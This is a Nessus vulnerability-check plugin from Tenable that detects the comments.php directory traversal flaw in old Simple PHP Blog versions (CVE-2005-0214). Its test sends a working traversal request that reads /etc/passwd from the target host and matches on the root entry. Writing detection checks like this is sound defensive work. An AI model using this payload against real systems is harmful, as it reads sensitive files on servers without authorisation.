#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(16137);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2012/12/20 00:54:41 $");

 script_cve_id("CVE-2005-0214");
 script_bugtraq_id(12193);
 script_osvdb_id(12823);
 
 script_name(english:"Simple PHP Blog comments.php Traversal Arbitrary File Access");
 script_summary(english:"Simple PHP Blog dir traversal");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to access arbitrary files from the remote
system.");
 script_set_attribute(attribute:"description", value:
"The remote version of Simple PHP Blog allows for retrieval of
arbitrary files from the web server.  These issues are due to a
failure of the application to properly sanitize user-supplied input
data.");
 script_set_attribute(attribute:"solution", value:
"Upgrade at least to version 0.3.7 r2.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/01/12");
 script_set_attribute(attribute:"vuln_publication_date", value:"2005/01/07");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:alexander_palmo:simple_php_blog");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("sphpblog_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/sphpblog");
 exit(0);
}

#
# the code
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/sphpblog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
 loc = matches[2];
 req = http_get(item:string(loc,  "/comments.php?y=05&m=01&entry=../../../../../../../etc/passwd"), port:port);
 rep = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( !rep )exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
 	security_hole(port);
}
